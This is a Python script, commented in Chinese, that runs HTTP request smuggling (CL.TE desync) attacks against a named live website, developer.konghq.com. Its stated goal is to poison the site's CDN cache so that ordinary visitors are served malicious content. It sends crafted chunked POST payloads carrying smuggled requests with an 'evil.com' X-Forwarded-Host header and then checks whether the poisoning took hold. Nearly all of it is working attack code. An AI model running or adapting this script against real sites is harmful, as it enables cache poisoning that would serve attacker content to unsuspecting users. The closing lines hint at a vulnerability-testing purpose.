#!/usr/bin/env python3
"""
HTTP Desync 缓存投毒测试
目标：通过走私请求污染CDN缓存，让正常用户看到恶意内容
"""
import socket
import ssl
import time

HOST = 'developer.konghq.com'
PORT = 443

def cache_poisoning_test():
    """尝试缓存投毒"""
    
    print("="*80)
    print(" HTTP Desync 缓存投毒测试")
    print("="*80)
    
    # 构造走私请求，尝试设置恶意的Cache-Control头
    smuggled_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Forwarded-Host: evil.com\r\n"
        f"X-Forwarded-Scheme: http\r\n"
        f"\r\n"
    )
    
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"{smuggled_request}"
    )
    
    print("\n[步骤1] 发送走私请求（尝试污染缓存）...")
    
    try:
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
        conn.settimeout(10)
        conn.connect((HOST, PORT))
        
        conn.sendall(payload.encode())
        time.sleep(2)
        
        # 发送正常请求触发走私
        normal = f"GET / HTTP/1.1\r\nHost: {HOST}\r\n\r\n"
        conn.sendall(normal.encode())
        
        # 接收响应
        start = time.time()
        all_responses = b""
        
        while time.time() - start < 5:
            try:
                data = conn.recv(8192)
                if not data:
                    break
                all_responses += data
                
                if all_responses.count(b'HTTP/1.1') >= 2:
                    break
            except:
                break
        
        conn.close()
        
        responses = all_responses.split(b'HTTP/1.1')[1:]
        
        if len(responses) >= 2:
            print(f"✅ 收到 {len(responses)} 个响应")
            
            second_resp = responses[1]
            header_end = second_resp.find(b'\r\n\r\n')
            
            if header_end != -1:
                headers = second_resp[:header_end].decode('utf-8', errors='ignore')
                
                print("\n[走私请求的响应头]")
                for line in headers.split('\r\n')[:15]:
                    print(f"  {line}")
                
                # 检查是否有缓存投毒的迹象
                indicators = []
                
                if 'evil.com' in headers.lower():
                    indicators.append("响应中包含evil.com")
                
                if 'x-forwarded-host' in headers.lower():
                    indicators.append("X-Forwarded-Host被处理")
                
                cache_status = ''
                for line in headers.split('\r\n'):
                    if 'cache-status' in line.lower() or 'x-cache' in line.lower():
                        cache_status = line
                        break
                
                if cache_status:
                    print(f"\n  缓存状态: {cache_status}")
                    if 'hit' in cache_status.lower():
                        indicators.append("缓存命中（可能被污染）")
                
                if indicators:
                    print(f"\n🔴 可疑指标:")
                    for ind in indicators:
                        print(f"  • {ind}")
                    return True
                else:
                    print(f"\n❌ 未检测到缓存投毒迹象")
                    return False
        else:
            print(f"❌ 只收到 {len(responses)} 个响应")
            return False
            
    except Exception as e:
        print(f"❌ 错误: {e}")
        return False

def test_cache_behavior():
    """测试缓存行为 - 看是否能通过走私影响后续请求"""
    
    print("\n" + "="*80)
    print(" 测试缓存行为")
    print("="*80)
    
    # 第一次：走私带有特殊头的请求
    print("\n[1] 发送走私请求...")
    
    smuggled = (
        f"GET /test-cache-poison HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"User-Agent: Cache-Poison-Test\r\n"
        f"\r\n"
    )
    
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"{smuggled}"
    )
    
    try:
        ctx = ssl.create_default_context()
        conn = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
        conn.settimeout(10)
        conn.connect((HOST, PORT))
        
        conn.sendall(payload.encode())
        time.sleep(1)
        
        normal = f"GET / HTTP/1.1\r\nHost: {HOST}\r\n\r\n"
        conn.sendall(normal.encode())
        
        resp1 = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                data = conn.recv(8192)
                if not data:
                    break
                resp1 += data
                if resp1.count(b'HTTP/1.1') >= 2:
                    break
            except:
                break
        
        conn.close()
        
        print(f"  走私请求完成")
        
    except Exception as e:
        print(f"  错误: {e}")
        return
    
    # 第二次：发送正常请求，看是否受到污染
    print("\n[2] 发送正常请求（检查是否被污染）...")
    
    try:
        ctx = ssl.create_default_context()
        conn = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
        conn.settimeout(10)
        conn.connect((HOST, PORT))
        
        normal = f"GET /test-cache-poison HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: Normal-User\r\n\r\n"
        conn.sendall(normal.encode())
        
        resp2 = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                data = conn.recv(8192)
                if not data:
                    break
                resp2 += data
                break
            except:
                break
        
        conn.close()
        
        if resp2:
            header_end = resp2.find(b'\r\n\r\n')
            if header_end != -1:
                headers = resp2[:header_end].decode('utf-8', errors='ignore')
                
                print("\n[正常请求的响应头]")
                for line in headers.split('\r\n')[:10]:
                    print(f"  {line}")
                
                # 检查是否有异常
                if 'Cache-Poison-Test' in headers:
                    print("\n🔴 响应中包含走私请求的User-Agent！缓存被污染！")
                    return True
                else:
                    print("\n✅ 未检测到缓存污染")
                    return False
        
    except Exception as e:
        print(f"  错误: {e}")
    
    return False

if __name__ == '__main__':
    results = []
    
    # 测试1: 缓存投毒
    r1 = cache_poisoning_test()
    results.append(('缓存投毒', r1))
    
    # 测试2: 缓存行为
    r2 = test_cache_behavior()
    results.append(('缓存行为', r2))
    
    # 总结
    print("\n" + "="*80)
    print(" 📊 缓存投毒测试结果")
    print("="*80)
    
    success = [r for r in results if r[1]]
    
    if success:
        print(f"\n🔴 发现 {len(success)} 个可疑迹象！")
        for name, _ in success:
            print(f"  • {name}")
        
        print("\n⚠️  HTTP Desync可能导致缓存投毒攻击")
        print("   建议立即修复！")
    else:
        print("\n✅ 未检测到明显的缓存投毒")
        print("\n结论:")
        print("  • 虽然能走私请求，但Netlify可能有缓存保护")
        print("  • 或者走私的请求没有被缓存")
        print("  • 需要更复杂的payload来测试")
